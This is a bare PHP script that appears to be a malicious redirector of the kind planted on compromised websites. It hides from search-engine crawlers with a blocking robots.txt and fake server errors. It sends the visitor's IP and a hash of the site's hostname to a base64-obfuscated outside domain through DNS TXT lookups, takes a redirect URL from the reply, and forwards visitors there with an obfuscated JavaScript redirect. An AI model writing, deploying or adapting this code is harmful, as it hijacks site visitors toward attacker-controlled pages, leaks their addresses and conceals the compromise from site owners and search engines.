<?php

error_reporting(0);

if (!empty($_SERVER['REQUEST_URI']) && strpos(strtolower($_SERVER['REQUEST_URI']), 'robots.txt') > 0) {
	die('User-agent: *\r\nDisallow: /\r\n');
}

$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
if ($ua == '' || preg_match('/crawl|spider|bot|mediapartners|slurp|ezooms|ia_archiver|lycos/i', $ua)) {
    header('HTTP/1.1 500 Internal Server Error');
    die();
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $inf = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $inf = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $inf = $_SERVER['REMOTE_ADDR'];
}

if (substr_count($inf, '.') == 3 && !isset($_GET['ts'])){
    $inf = 'ip-'.str_replace('.', '-', $inf).'.';
} else {
    $inf = '';
}

$host = $_SERVER['SERVER_NAME'];
if (strlen($host) > 0  && !isset($_GET['ts'])) {
    $inf = $inf.'hst-'.substr(md5(strtolower($host)), -8).'.';
}

$d = array(base64_decode(str_replace('.', '', 'ZmV0Y2hkb.S4lc3B1bG.xkbnMu.Y29t')));
foreach ($d as $k=>$v) {
    $d[$k] = sprintf($v, $inf);
}

for ($i = rand(0, count($d)); $i < 20 + count($d); $i++) {
    $s = dns_get_record($d[$i % count($d)], DNS_TXT);
    $location = '';
    if (is_array($s) && (count($s) > 0) && isset($s[0]['txt']) && strlen($s[0]['txt'])) {
        if ((strpos($s[0]['txt'], 'blocked')) !== FALSE) {
            header('HTTP/1.1 500 Internal Server Error');
            die();
        }
        if ((strpos($s[0]['txt'], 'http')) !== FALSE) {
            $location = $s[0]['txt'];
            break;
        }
    }
}

if (!strlen($location))
    die();

if (isset($_GET['ts'])) {
    echo 'OK'.$location.'ERR';
} else {
    echo '<html><body><script>'.base64_decode(str_replace('.', '', 'd2luZG.93LmxvY2F0aW9uLn.JlcGxhY2U=')).'("'.$location.str_replace("\\", "\\\\", $_SERVER['REQUEST_URI']).'");</script></body></html>';
}
